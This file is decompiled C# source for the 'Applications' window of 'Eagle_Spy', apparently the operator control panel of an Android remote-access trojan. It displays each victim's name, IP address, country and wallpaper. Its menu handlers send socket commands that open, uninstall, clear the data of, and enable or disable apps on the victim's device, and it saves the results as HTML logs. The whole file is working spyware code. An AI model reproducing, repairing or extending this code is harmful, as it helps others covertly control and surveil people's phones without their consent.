using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x0200001D RID: 29
	[DesignerGenerated]
	public partial class Applications : Form
	{
		// Token: 0x060001FF RID: 511 RVA: 0x0001170C File Offset: 0x0000F90C
		public Applications()
		{
			base.Load += this.Applications_Load;
			base.Activated += this.AngelAndroidForm_Activated;
			base.Deactivate += this.AngelAndroidForm_Deactivate;
			this.Title = "null";
			this.BoxTitlePaintEventArgsWait = false;
			this.InitializeComponent();
		}

		// Token: 0x06000202 RID: 514 RVA: 0x000127CC File Offset: 0x000109CC
		public void CraxsStyle()
		{
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) != 0)
			{
				if (Operators.CompareString(language, "CN", false) == 0)
				{
					this.ctx.Items[0].Text = "打开";
					this.ctx.Items[1].Text = "刷新";
					this.ctx.Items[2].Text = "特性";
					this.ctx.Items[3].Text = "节省";
					this.ctx.Items[4].Text = "另存为";
					this.ctx.Items[5].Text = "卸载";
					this.ctx.Items[6].Text = "禁用";
					this.ctx.Items[7].Text = "使能够";
					return;
				}
			}
			else
			{
				this.ctx.Items[0].Text = "فتح";
				this.ctx.Items[1].Text = "تحديث";
				this.ctx.Items[2].Text = "خصائص";
				this.ctx.Items[3].Text = "حفظ";
				this.ctx.Items[4].Text = "حفظ كـ";
				this.ctx.Items[5].Text = "إلغاء التثبيت";
				this.ctx.Items[6].Text = "تعطيل";
				this.ctx.Items[7].Text = "تفعيل";
			}
		}

		// Token: 0x06000203 RID: 515 RVA: 0x00002423 File Offset: 0x00000623
		private void SpyStyle()
		{
		}

		// Token: 0x06000204 RID: 516 RVA: 0x00002661 File Offset: 0x00000861
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
				return;
			}
			this.TOpacity.Enabled = false;
		}

		// Token: 0x06000205 RID: 517 RVA: 0x000129B4 File Offset: 0x00010BB4
		private void Applications_Load(object sender, EventArgs e)
		{
			base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\2.ico");
			this.CraxsStyle();
			try
			{
				this.ClientPic.Image = this.classClient.Wallpaper;
				this.clinameinfo.Text = string.Concat(new string[]
				{
					"Name: ",
					this.classClient.ClientName,
					Strings.Space(2),
					"IP: ",
					this.classClient.ClientAddressIP,
					Strings.Space(2),
					"Country: ",
					this.classClient.Country
				});
			}
			catch (Exception)
			{
			}
			this.DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
			this.DGV0.DefaultCellStyle.Font = reso.f;
			if (Operators.CompareString(SpySettings.SAVING_DATA, "No", false) == 0)
			{
				this.SaveToolStripMenuItem.Visible = true;
				this.SaveAsToolStripMenuItem.Visible = true;
			}
			this.Text = this.Title;
			this.TOpacity.Interval = SpySettings.T_Interval;
			this.TOpacity.Enabled = true;
			this.BoxTitlePaintEventArgsWait = true;
		}

		// Token: 0x06000206 RID: 518 RVA: 0x00012AFC File Offset: 0x00010CFC
		private void OpenToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.DGV0.SelectedRows.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Value);
					if (this.classClient != null)
					{
						object[] array = new object[]
						{
							this.Client,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient1,
								Data.SPL_SOCKET,
								reso.domen,
								".apps",
								Data.SPL_SOCKET,
								"method",
								Data.SPL_SOCKET,
								SecurityKey.resultClient,
								Data.SPL_SOCKET,
								"open",
								Data.SPL_DATA,
								text
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(array);
					}
				}
			}
		}

		// Token: 0x06000207 RID: 519 RVA: 0x00012C30 File Offset: 0x00010E30
		private void PropertiesToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.DGV0.SelectedRows.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Value);
					if (this.classClient != null)
					{
						object[] array = new object[]
						{
							this.Client,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient1,
								Data.SPL_SOCKET,
								reso.domen,
								".apps",
								Data.SPL_SOCKET,
								"method",
								Data.SPL_SOCKET,
								SecurityKey.AppsProperties,
								Data.SPL_SOCKET,
								"properties",
								Data.SPL_DATA,
								text
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(array);
					}
				}
			}
		}

		// Token: 0x06000208 RID: 520 RVA: 0x00012D64 File Offset: 0x00010F64
		private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
			saveFileDialog.Filter = "html (*.html)|*.html";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					reso.SAVEit((Array)a0);
				}, new object[]
				{
					this.DGV0,
					"null",
					saveFileDialog.FileName,
					this.tmpClientName,
					this.tmpCountry + " - " + this.tmpAddressIP,
					"Applications",
					"log",
					"null"
				});
			}
			saveFileDialog.Dispose();
		}

		// Token: 0x06000209 RID: 521 RVA: 0x00012E34 File Offset: 0x00011034
		private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			reso.Directory_Exist(this.classClient);
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				reso.SAVEit((Array)a0);
			}, new object[]
			{
				this.DGV0,
				this.tmpFolderUSER,
				"Applications",
				this.tmpClientName,
				this.tmpCountry + " - " + this.tmpAddressIP,
				"Applications",
				"log",
				DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
			});
		}

		// Token: 0x0600020A RID: 522 RVA: 0x00012EE4 File Offset: 0x000110E4
		private void BoxTitle_Paint(object sender, PaintEventArgs e)
		{
			checked
			{
				if (this.BoxTitlePaintEventArgsWait)
				{
					int count = this.DGV0.Rows.Count;
					string text = "All " + Conversions.ToString(count);
					string text2 = "Selected " + Conversions.ToString(this.DGV0.SelectedRows.Count);
					Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
					e.Graphics.DrawLine(new Pen(Color.FromArgb(50, (int)defaultColor_Foreground.R, (int)defaultColor_Foreground.G, (int)defaultColor_Foreground.B)), 0, 1, this.BoxTitle.Width, 1);
					Brush brush = new SolidBrush(SpySettings.DefaultColor_Foreground);
					Brush brush2 = new SolidBrush(Color.FromArgb(170, (int)this.BoxTitle.BackColor.R, (int)this.BoxTitle.BackColor.G, (int)this.BoxTitle.BackColor.B));
					Size size = TextRenderer.MeasureText(text + Strings.Space(10) + text2, reso.f);
					Rectangle rectangle = new Rectangle(0, 2, this.BoxTitle.Width, size.Height + 5);
					e.Graphics.FillRectangle(new Pen(brush2).Brush, rectangle);
					e.Graphics.DrawString(text + Strings.Space(10) + text2 + Strings.Space(10), reso.f, brush, 0f, 2f);
					Size size2 = TextRenderer.MeasureText("S", reso.f);
					if (this.BoxTitle.Height != size2.Height + 3)
					{
						this.BoxTitle.Height = size2.Height + 3;
					}
				}
			}
		}

		// Token: 0x0600020B RID: 523 RVA: 0x00002697 File Offset: 0x00000897
		private void AngelAndroidForm_Activated(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x0600020C RID: 524 RVA: 0x00002697 File Offset: 0x00000897
		private void AngelAndroidForm_Deactivate(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x0600020D RID: 525 RVA: 0x00002697 File Offset: 0x00000897
		private void BoxTitle_Resize(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x0600020E RID: 526 RVA: 0x00013094 File Offset: 0x00011294
		private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				object[] array = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".apps",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.Apps,
						Data.SPL_SOCKET,
						"load",
						Data.SPL_DATA,
						"y"
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x0600020F RID: 527 RVA: 0x00013158 File Offset: 0x00011358
		private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.DGV0.SelectedRows.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Value);
					if (this.classClient != null)
					{
						TcpClient myClient = this.classClient.myClient;
						string[] array = this.classClient.Keys.Split(new char[] { ':' });
						object[] array2 = new object[]
						{
							myClient,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient2,
								Data.SPL_SOCKET,
								"SFD<*>",
								text,
								Data.SPL_SOCKET,
								array[0],
								Data.SPL_SOCKET,
								array[1],
								Data.SPL_SOCKET,
								SecurityKey.Lockscreen,
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Data.SPL_ARRAY,
								Data.SPL_SOCKET,
								this.classClient.ClientRemoteAddress
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(array2);
					}
				}
			}
		}

		// Token: 0x06000210 RID: 528 RVA: 0x000132EC File Offset: 0x000114EC
		private void ClearAppDataToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.DGV0.SelectedRows.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Value);
					if (this.classClient != null)
					{
						TcpClient myClient = this.classClient.myClient;
						string[] array = this.classClient.Keys.Split(new char[] { ':' });
						object[] array2 = new object[]
						{
							myClient,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient2,
								Data.SPL_SOCKET,
								"CRD<*>E>",
								text,
								Data.SPL_SOCKET,
								array[0],
								Data.SPL_SOCKET,
								array[1],
								Data.SPL_SOCKET,
								SecurityKey.Lockscreen,
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Data.SPL_ARRAY,
								Data.SPL_SOCKET,
								this.classClient.ClientRemoteAddress
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(array2);
					}
				}
			}
		}

		// Token: 0x06000211 RID: 529 RVA: 0x00013480 File Offset: 0x00011680
		private void EnableToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.DGV0.SelectedRows.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Value);
					if (this.classClient != null)
					{
						TcpClient myClient = this.classClient.myClient;
						string[] array = this.classClient.Keys.Split(new char[] { ':' });
						object[] array2 = new object[]
						{
							myClient,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient2,
								Data.SPL_SOCKET,
								"CRD<*>D>",
								text,
								Data.SPL_SOCKET,
								array[0],
								Data.SPL_SOCKET,
								array[1],
								Data.SPL_SOCKET,
								SecurityKey.Lockscreen,
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Data.SPL_ARRAY,
								Data.SPL_SOCKET,
								this.classClient.ClientRemoteAddress
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(array2);
					}
				}
			}
		}

		// Token: 0x06000212 RID: 530 RVA: 0x00002697 File Offset: 0x00000897
		private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x06000213 RID: 531 RVA: 0x00002697 File Offset: 0x00000897
		private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x06000214 RID: 532 RVA: 0x00002697 File Offset: 0x00000897
		private void DGV0_SelectionChanged(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x06000215 RID: 533
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x06000216 RID: 534
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x06000217 RID: 535 RVA: 0x000026A4 File Offset: 0x000008A4
		private void clinameinfo_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Applications.ReleaseCapture();
				Applications.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x0400009C RID: 156
		public TcpClient Client;

		// Token: 0x0400009D RID: 157
		public Client classClient;

		// Token: 0x0400009E RID: 158
		public string Title;

		// Token: 0x0400009F RID: 159
		public string tmpFolderUSER;

		// Token: 0x040000A0 RID: 160
		public string tmpClientName;

		// Token: 0x040000A1 RID: 161
		public string tmpCountry;

		// Token: 0x040000A2 RID: 162
		public string tmpAddressIP;

		// Token: 0x040000A3 RID: 163
		private bool BoxTitlePaintEventArgsWait;
	}
}
